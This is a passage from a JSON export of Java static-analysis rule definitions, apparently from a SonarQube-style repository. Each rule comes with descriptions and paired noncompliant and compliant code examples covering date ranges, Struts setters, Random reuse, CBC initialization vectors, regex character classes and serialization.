(c.get(Calendar.MONTH) == 11) {\n  // ...\n}\n</pre>",
            "mdDesc": "<p>Whether the valid value ranges for <code>Date</code> fields start with 0 or 1 varies by field. For instance, month starts at 0, and day of month\nstarts at 1. Enter a date value that goes past the end of the valid range, and the date will roll without error or exception. For instance, enter 12\nfor month, and you'll get January of the following year.</p>\n<p>This rule checks for bad values used in conjunction with <code>java.util.Date</code>, <code>java.sql.Date</code>, and\n<code>java.util.Calendar</code>. Specifically, values outside of the valid ranges:</p>\n<table>\n  <tbody>\n    <tr>\n      <th>Field</th>\n      <th>Valid</th>\n    </tr>\n    <tr>\n      <td>month</td>\n      <td>0-11</td>\n    </tr>\n    <tr>\n      <td>date (day)</td>\n      <td>0-31</td>\n    </tr>\n    <tr>\n      <td>hour</td>\n      <td>0-23</td>\n    </tr>\n    <tr>\n      <td>minute</td>\n      <td>0-60</td>\n    </tr>\n    <tr>\n      <td>second</td>\n      <td>0-61</td>\n    </tr>\n  </tbody>\n</table>\n<p>Note that this rule does not check for invalid leap years, leap seconds (second = 61), or invalid uses of the 31st day of the month.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nDate d = new Date();\nd.setDate(25);\nd.setYear(2014);\nd.setMonth(12);  // Noncompliant; rolls d into the next year\n\nCalendar c = new GregorianCalendar(2014, 12, 25);  // Noncompliant\nif (c.get(Calendar.MONTH) == 12) {  // Noncompliant; invalid comparison\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDate d = new Date();\nd.setDate(25);\nd.setYear(2014);\nd.setMonth(11);\n\nCalendar c = new Gregorian Calendar(2014, 11, 25);\nif (c.get(Calendar.MONTH) == 11) {\n  // ...\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4531",
            "repo": "java",
            "name": "Using setters in Struts 2 ActionSupport is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using setters in Struts 2 ActionSupport is security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1006\">CVE-2012-1006</a> </li>\n</ul>\n<p>All classes extending <code>com.opensymphony.xwork2.ActionSupport</code> are potentially remotely reachable. An action class extending\nActionSupport will receive all HTTP parameters sent and these parameters will be automatically mapped to the setters of the Struts 2 action class. One\nshould review the use of the fields set by the setters, to be sure they are used safely. By default, they should be considered as untrusted\ninputs.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the setter is needed. There is no need for it if the attribute's goal is not to map queries' parameter. </li>\n  <li> the value provided to the setter is properly sanitized before being used or stored. (*) </li>\n</ul>\n<p>(*) You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>As said in Struts documentation: <a href=\"https://struts.apache.org/security/#do-not-define-setters-when-not-needed\">\"Do not define setters when\nnot needed\"</a></p>\n<p>Sanitize the user input. This can be for example done by implementing the <code>validate()</code> method of\n<code>com.opensymphony.xwork2.ActionSupport</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class AccountBalanceAction extends ActionSupport {\n  private static final long serialVersionUID = 1L;\n  private Integer accountId;\n\n  // this setter might be called with user input\n  public void setAccountId(Integer accountId) {\n    this.accountId = accountId;\n  }\n\n  @Override\n  public String execute() throws Exception {\n    // call a service to get the account's details and its balance\n    [...]\n    return SUCCESS;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Using setters in Struts 2 ActionSupport is security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1006\">CVE-2012-1006</a> </li>\n</ul>\n<p>All classes extending <code>com.opensymphony.xwork2.ActionSupport</code> are potentially remotely reachable. An action class extending\nActionSupport will receive all HTTP parameters sent and these parameters will be automatically mapped to the setters of the Struts 2 action class. One\nshould review the use of the fields set by the setters, to be sure they are used safely. By default, they should be considered as untrusted\ninputs.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the setter is needed. There is no need for it if the attribute's goal is not to map queries' parameter. </li>\n  <li> the value provided to the setter is properly sanitized before being used or stored. (*) </li>\n</ul>\n<p>(*) You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>As said in Struts documentation: <a href=\"https://struts.apache.org/security/#do-not-define-setters-when-not-needed\">\"Do not define setters when\nnot needed\"</a></p>\n<p>Sanitize the user input. This can be for example done by implementing the <code>validate()</code> method of\n<code>com.opensymphony.xwork2.ActionSupport</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class AccountBalanceAction extends ActionSupport {\n  private static final long serialVersionUID = 1L;\n  private Integer accountId;\n\n  // this setter might be called with user input\n  public void setAccountId(Integer accountId) {\n    this.accountId = accountId;\n  }\n\n  @Override\n  public String execute() throws Exception {\n    // call a service to get the account's details and its balance\n    [...]\n    return SUCCESS;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "MAJOR",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2119",
            "repo": "java",
            "name": "\"Random\" objects should be reused",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Creating a new <code>Random</code> object each time a random value is needed is inefficient and may produce numbers which are not random depending\non the JDK. For better efficiency and randomness, create a single <code>Random</code>, then store, and reuse it.</p>\n<p>The <code>Random()</code> constructor tries to set the seed with a distinct value every time. However there is no guarantee that the seed will be\nrandom or even uniformly distributed. Some JDK will use the current time as seed, which makes the generated numbers not random at all.</p>\n<p>This rule finds cases where a new <code>Random</code> is created each time a method is invoked and assigned to a local random variable.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomethingCommon() {\n  Random rand = new Random();  // Noncompliant; new instance created with each invocation\n  int rValue = rand.nextInt();\n  //...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate Random rand = SecureRandom.getInstanceStrong();  // SecureRandom is preferred to Random\n\npublic void doSomethingCommon() {\n  int rValue = this.rand.nextInt();\n  //...\n</pre>\n<h2>Exceptions</h2>\n<p>A class which uses a <code>Random</code> in its constructor or in a static <code>main</code> function and nowhere else will be ignored by this\nrule.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
            "mdDesc": "<p>Creating a new <code>Random</code> object each time a random value is needed is inefficient and may produce numbers which are not random depending\non the JDK. For better efficiency and randomness, create a single <code>Random</code>, then store, and reuse it.</p>\n<p>The <code>Random()</code> constructor tries to set the seed with a distinct value every time. However there is no guarantee that the seed will be\nrandom or even uniformly distributed. Some JDK will use the current time as seed, which makes the generated numbers not random at all.</p>\n<p>This rule finds cases where a new <code>Random</code> is created each time a method is invoked and assigned to a local random variable.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomethingCommon() {\n  Random rand = new Random();  // Noncompliant; new instance created with each invocation\n  int rValue = rand.nextInt();\n  //...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate Random rand = SecureRandom.getInstanceStrong();  // SecureRandom is preferred to Random\n\npublic void doSomethingCommon() {\n  int rValue = this.rand.nextInt();\n  //...\n</pre>\n<h2>Exceptions</h2>\n<p>A class which uses a <code>Random</code> in its constructor or in a static <code>main</code> function and nowhere else will be ignored by this\nrule.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "owasp-a6"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S881",
            "repo": "java",
            "name": "Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>\n<ul>\n  <li> It can significantly impair the readability of the code. </li>\n  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>\n  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nu8a = ++u8b + u8c--;\nfoo = bar++ / 4;\n</pre>\n<h2>Compliant Solution</h2>\n<p>The following sequence is clearer and therefore safer:</p>\n<pre>\n++u8b;\nu8a = u8b + u8c;\nu8c--;\nfoo = bar / 4;\nbar++;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/StYxBQ\">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/IXw-BQ\">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side effects </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/NDdGBQ\">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the same\n  object within an expression </li>\n</ul>",
            "mdDesc": "<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>\n<ul>\n  <li> It can significantly impair the readability of the code. </li>\n  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>\n  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nu8a = ++u8b + u8c--;\nfoo = bar++ / 4;\n</pre>\n<h2>Compliant Solution</h2>\n<p>The following sequence is clearer and therefore safer:</p>\n<pre>\n++u8b;\nu8a = u8b + u8c;\nu8c--;\nfoo = bar / 4;\nbar++;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/StYxBQ\">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/IXw-BQ\">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side effects </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/NDdGBQ\">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the same\n  object within an expression </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3329",
            "repo": "java",
            "name": "Cipher Block Chaining IV's should be random and unique",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In encryption, when Cipher Block Chaining (CBC) is used, the Initialization Vector (IV) must be random and unpredictable. Otherwise, the encrypted\nvalue is vulnerable to crypto-analysis attacks such as the \"Chosen-Plaintext Attack\".</p>\n<p>An IV value should be associated to one, and only one encryption cycle, because the IV's purpose is to ensure that the same plaintext encrypted\ntwice will yield two different ciphertexts.</p>\n<p>To that end, IV's should be:</p>\n<ul>\n  <li> random </li>\n  <li> unpredictable </li>\n  <li> publishable (IVs are frequently published) </li>\n  <li> authenticated, along with the ciphertext, with a Message Authentication Code (MAC) </li>\n</ul>\n<p>This rule raises an issue when the IV is:</p>\n<ul>\n  <li> hard-coded </li>\n  <li> created using <code>java.util.Random</code> rather than <code>java.security.SecureRandom</code>. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyCbcClass {\n\n  public String applyCBC(String strKey, String plainText) {\n    byte[] bytesIV = \"7cVgr5cbdCZVw5WY\".getBytes(\"UTF-8\");\n\n    /* KEY + IV setting */\n    IvParameterSpec iv = new IvParameterSpec(bytesIV);\n    SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes(\"UTF-8\"), \"AES\");\n\n    /* Ciphering */\n    Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);  // Noncompliant because IV hard coded and cannot vary with each ciphering round\n    byte[] encryptedBytes = cipher.doFinal(plainText.getBytes(\"UTF-8\"));\n    return DatatypeConverter.printBase64Binary(bytesIV) // IV is typically published\n            + \";\" + DatatypeConverter.printBase64Binary(encryptedBytes);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyCbcClass {\n\n  SecureRandom random = new SecureRandom();\n\n  public String applyCBC(String strKey, String plainText) {\n    byte[] bytesIV = new byte[16];\n    random.nextBytes(bytesIV);\n\n    /* KEY + IV setting */\n    IvParameterSpec iv = new IvParameterSpec(bytesIV);\n    SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes(\"UTF-8\"), \"AES\");\n\n    /* Ciphering */\n    Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);\n    byte[] encryptedBytes = cipher.doFinal(plainText.getBytes(\"UTF-8\"));\n    return DatatypeConverter.printBase64Binary(bytesIV)\n            + \";\" + DatatypeConverter.printBase64Binary(encryptedBytes);\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/330\">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>\n  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#STATIC_IV\">STATIC_IV</a> </li>\n</ul>",
            "mdDesc": "<p>In encryption, when Cipher Block Chaining (CBC) is used, the Initialization Vector (IV) must be random and unpredictable. Otherwise, the encrypted\nvalue is vulnerable to crypto-analysis attacks such as the \"Chosen-Plaintext Attack\".</p>\n<p>An IV value should be associated to one, and only one encryption cycle, because the IV's purpose is to ensure that the same plaintext encrypted\ntwice will yield two different ciphertexts.</p>\n<p>To that end, IV's should be:</p>\n<ul>\n  <li> random </li>\n  <li> unpredictable </li>\n  <li> publishable (IVs are frequently published) </li>\n  <li> authenticated, along with the ciphertext, with a Message Authentication Code (MAC) </li>\n</ul>\n<p>This rule raises an issue when the IV is:</p>\n<ul>\n  <li> hard-coded </li>\n  <li> created using <code>java.util.Random</code> rather than <code>java.security.SecureRandom</code>. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyCbcClass {\n\n  public String applyCBC(String strKey, String plainText) {\n    byte[] bytesIV = \"7cVgr5cbdCZVw5WY\".getBytes(\"UTF-8\");\n\n    /* KEY + IV setting */\n    IvParameterSpec iv = new IvParameterSpec(bytesIV);\n    SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes(\"UTF-8\"), \"AES\");\n\n    /* Ciphering */\n    Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);  // Noncompliant because IV hard coded and cannot vary with each ciphering round\n    byte[] encryptedBytes = cipher.doFinal(plainText.getBytes(\"UTF-8\"));\n    return DatatypeConverter.printBase64Binary(bytesIV) // IV is typically published\n            + \";\" + DatatypeConverter.printBase64Binary(encryptedBytes);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyCbcClass {\n\n  SecureRandom random = new SecureRandom();\n\n  public String applyCBC(String strKey, String plainText) {\n    byte[] bytesIV = new byte[16];\n    random.nextBytes(bytesIV);\n\n    /* KEY + IV setting */\n    IvParameterSpec iv = new IvParameterSpec(bytesIV);\n    SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes(\"UTF-8\"), \"AES\");\n\n    /* Ciphering */\n    Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n    cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);\n    byte[] encryptedBytes = cipher.doFinal(plainText.getBytes(\"UTF-8\"));\n    return DatatypeConverter.printBase64Binary(bytesIV)\n            + \";\" + DatatypeConverter.printBase64Binary(encryptedBytes);\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/330\">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>\n  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#STATIC_IV\">STATIC_IV</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a6"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S5869",
            "repo": "java",
            "name": "Character classes in regular expressions should not contain the same character twice",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Character classes in regular expressions are a convenient way to match one of several possible characters by listing the allowed characters or\nranges of characters. If the same character is listed twice in the same character class or if the character class contains overlapping ranges, this\nhas no effect.</p>\n<p>Thus duplicate characters in a character class are either a simple oversight or a sign that a range in the character class matches more than is\nintended or that the author misunderstood how character classes work and wanted to match more than one character. A common example of the latter\nmistake is trying to use a range like <code>[0-99]</code> to match numbers of up to two digits, when in fact it is equivalent to <code>[0-9]</code>.\nAnother common cause is forgetting to escape the `-` character, creating an unintended range that overlaps with other characters in the character\nclass.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstr.matches(\"[0-99]\") // Noncompliant, this won't actually match strings with two digits\nstr.matches(\"[0-9.-_]\") // Noncompliant, .-_ is a range that already contains 0-9 (as well as various other characters such as capital letters)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstr.matches(\"[0-9]{1,2}\")\nstr.matches(\"[0-9.\\\\-_]\")\n</pre>",
            "mdDesc": "<p>Character classes in regular expressions are a convenient way to match one of several possible characters by listing the allowed characters or\nranges of characters. If the same character is listed twice in the same character class or if the character class contains overlapping ranges, this\nhas no effect.</p>\n<p>Thus duplicate characters in a character class are either a simple oversight or a sign that a range in the character class matches more than is\nintended or that the author misunderstood how character classes work and wanted to match more than one character. A common example of the latter\nmistake is trying to use a range like <code>[0-99]</code> to match numbers of up to two digits, when in fact it is equivalent to <code>[0-9]</code>.\nAnother common cause is forgetting to escape the `-` character, creating an unintended range that overlaps with other characters in the character\nclass.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstr.matches(\"[0-99]\") // Noncompliant, this won't actually match strings with two digits\nstr.matches(\"[0-9.-_]\") // Noncompliant, .-_ is a range that already contains 0-9 (as well as various other characters such as capital letters)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstr.matches(\"[0-9]{1,2}\")\nstr.matches(\"[0-9.\\\\-_]\")\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1149",
            "repo": "java",
            "name": "Synchronized classes Vector, Hashtable, Stack and StringBuffer should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Early classes of the Java API, such as <code>Vector</code>, <code>Hashtable</code> and <code>StringBuffer</code>, were synchronized to make them\nthread-safe. Unfortunately, synchronization has a big negative impact on performance, even when using these collections from a single thread.</p>\n<p>It is better to use their new unsynchronized replacements:</p>\n<ul>\n  <li> <code>ArrayList</code> or <code>LinkedList</code> instead of <code>Vector</code> </li>\n  <li> <code>Deque</code> instead of <code>Stack</code> </li>\n  <li> <code>HashMap</code> instead of <code>Hashtable</code> </li>\n  <li> <code>StringBuilder</code> instead of <code>StringBuffer</code> </li>\n</ul>\n<p>Even when used in synchronized context, you should think twice before using it, since it's usage can be tricky. If you are confident the usage is\nlegitimate, you can safely ignore this warning.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nVector cats = new Vector();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nArrayList cats = new ArrayList();\n</pre>\n<h2>Exceptions</h2>\n<p>Use of those synchronized classes is ignored in the signatures of overriding methods.</p>\n<pre>\n@Override\npublic Vector getCats() {...}\n</pre>",
            "mdDesc": "<p>Early classes of the Java API, such as <code>Vector</code>, <code>Hashtable</code> and <code>StringBuffer</code>, were synchronized to make them\nthread-safe. Unfortunately, synchronization has a big negative impact on performance, even when using these collections from a single thread.</p>\n<p>It is better to use their new unsynchronized replacements:</p>\n<ul>\n  <li> <code>ArrayList</code> or <code>LinkedList</code> instead of <code>Vector</code> </li>\n  <li> <code>Deque</code> instead of <code>Stack</code> </li>\n  <li> <code>HashMap</code> instead of <code>Hashtable</code> </li>\n  <li> <code>StringBuilder</code> instead of <code>StringBuffer</code> </li>\n</ul>\n<p>Even when used in synchronized context, you should think twice before using it, since it's usage can be tricky. If you are confident the usage is\nlegitimate, you can safely ignore this warning.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nVector cats = new Vector();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nArrayList cats = new ArrayList();\n</pre>\n<h2>Exceptions</h2>\n<p>Use of those synchronized classes is ignored in the signatures of overriding methods.</p>\n<pre>\n@Override\npublic Vector getCats() {...}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5868",
            "repo": "java",
            "name": "Unicode Grapheme Clusters should be avoided inside regex character classes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When placing Unicode <a href=\"https://unicode.org/glossary/#grapheme_cluster\">Grapheme Clusters</a> (characters which require to be encoded in\nmultiple <a href=\"https://unicode.org/glossary/#code_point\">Code Points</a>) inside a character class of a regular expression, this will likely lead\nto unintended behavior.</p>\n<p>For instance, the grapheme cluster <code>c̈</code> requires two code points: one for <code>'c'</code>, followed by one for the <em>umlaut</em>\nmodifier <code>'\\u{0308}'</code>. If placed within a character class, such as <code>[c̈]</code>, the regex will consider the character class being the\nenumeration <code>[c\\u{0308}]</code> instead. It will, therefore, match every <code>'c'</code> and every <em>umlaut</em> that isn't expressed as a\nsingle codepoint, which is extremely unlikely to be the intended behavior.</p>\n<p>This rule raises an issue every time Unicode Grapheme Clusters are used within a character class of a regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\"cc̈d̈d\".replaceAll(\"[c̈d̈]\", \"X\"); // Noncompliant, print \"XXXXXX\" instead of expected \"cXXd\".\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n\"cc̈d̈d\".replaceAll(\"c̈|d̈\", \"X\"); // print \"cXXd\"\n</pre>",
            "mdDesc": "<p>When placing Unicode <a href=\"https://unicode.org/glossary/#grapheme_cluster\">Grapheme Clusters</a> (characters which require to be encoded in\nmultiple <a href=\"https://unicode.org/glossary/#code_point\">Code Points</a>) inside a character class of a regular expression, this will likely lead\nto unintended behavior.</p>\n<p>For instance, the grapheme cluster <code>c̈</code> requires two code points: one for <code>'c'</code>, followed by one for the <em>umlaut</em>\nmodifier <code>'\\u{0308}'</code>. If placed within a character class, such as <code>[c̈]</code>, the regex will consider the character class being the\nenumeration <code>[c\\u{0308}]</code> instead. It will, therefore, match every <code>'c'</code> and every <em>umlaut</em> that isn't expressed as a\nsingle codepoint, which is extremely unlikely to be the intended behavior.</p>\n<p>This rule raises an issue every time Unicode Grapheme Clusters are used within a character class of a regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\"cc̈d̈d\".replaceAll(\"[c̈d̈]\", \"X\"); // Noncompliant, print \"XXXXXX\" instead of expected \"cXXd\".\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n\"cc̈d̈d\".replaceAll(\"c̈|d̈\", \"X\"); // print \"cXXd\"\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2118",
            "repo": "java",
            "name": "Non-serializable classes should not be written",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Nothing in a non-serializable class will be written out to file, and attempting to serialize such a class will result in an exception being thrown.\nOnly a class that <code>implements Serializable</code> or one that extends such a class can successfully be serialized (or de-serialized). </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Vegetable {  // neither implements Serializable nor extends a class that does\n  //...\n}\n\npublic class Menu {\n  public void meal() throws IOException {\n    Vegetable veg;\n    //...\n    FileOutputStream fout = new FileOutputStream(veg.getName());\n    ObjectOutputStream oos = new ObjectOutputStream(fout);\n    oos.writeObject(veg);  // Noncompliant. Nothing will be written\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Vegetable implements Serializable {  // can now be serialized\n  //...\n}\n\npublic class Menu {\n  public void meal() throws IOException {\n    Vegetable veg;\n    //...\n    FileOutputStream fout = new FileOutputStream(veg.getName());\n    ObjectOutputStream oos = new ObjectOutputStream(fout);\n    oos.writeObject(veg);\n  }\n}\n</pre>",
